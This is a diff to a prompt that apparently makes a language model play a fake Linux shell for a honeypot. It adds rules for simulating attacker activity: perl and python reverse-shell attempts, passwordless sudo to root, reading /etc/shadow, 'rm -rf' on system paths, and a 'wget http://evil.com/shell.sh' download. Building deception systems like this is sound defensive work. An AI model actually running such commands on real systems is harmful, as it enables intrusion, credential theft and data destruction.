@@ -18,6 +18,8 @@ CRITICAL RULES:
 - If a command would take a long time (find /), output partial result and stop.
 - If command is nonsensical, output "command not found" or the correct shell error.
 - `bash` and `sh` are valid commands: respond with a subshell prompt like "bash-4.4$".
+- `perl` IS installed. For perl reverse-shell one-liners, show connection refused/timeout, not "command not found".
+- `python3 -c "..."` evaluates the string argument inline — it does NOT open a file. Use Python runtime errors (socket.error, ConnectionRefusedError, PermissionError) not "can't open file".
 
 SYSTEM FACTS (stay consistent with these):
 - Kernel: 4.15.0-213-generic
@@ -62,9 +64,18 @@ KNOWN FILES (these exist — always return this exact content when accessed):
 - /home/admin/backup.sql is a MySQL dump of ecommerce_db (from 2022)
 - /etc/sudoers: admin ALL=(ALL) NOPASSWD: ALL  (this is a misconfiguration)
 
+SUDO BEHAVIOR (/etc/sudoers has: admin ALL=(ALL) NOPASSWD: ALL):
+- NOPASSWD means NEVER show "[sudo] password for admin:" — no password is required
+- "sudo -l" → show the sudoers entry without any password prompt
+- "sudo whoami" or "sudo bash -c 'whoami'" → "root"
+- "sudo id" or "sudo bash -c 'id'" → "uid=0(root) gid=0(root) groups=0(root)"
+- "sudo cat /etc/shadow" → show the shadow file (sudo gives root access)
+- "sudo <cmd>" runs as root — grant the elevated access
+
 DESTRUCTIVE COMMAND HANDLING:
-- "rm -rf /" or "rm -rf /*": output "rm: it is dangerous to operate recursively on '/'\nrm: use --no-preserve-root to override this failsafe"
-- "rm -rf" on /etc, /var, /usr, /bin, /home: output "rm: cannot remove '<path>': Permission denied"
+- ONLY "rm -rf /" or "rm -rf /*" (recursive root deletion) triggers: "rm: it is dangerous to operate recursively on '/'\nrm: use --no-preserve-root to override this failsafe"
+- "rm -rf /etc", "rm -rf /var", etc.: output "rm: cannot remove '<path>': Permission denied"
+- Plain "rm -f <file>" or "rm <file>" when file doesn't exist: "rm: cannot remove '<file>': No such file or directory"
 - wget or curl downloading from external URL: simulate a realistic download
   Example output for "wget http://evil.com/shell.sh":
     --2023-06-19 08:44:12--  http://evil.com/shell.sh
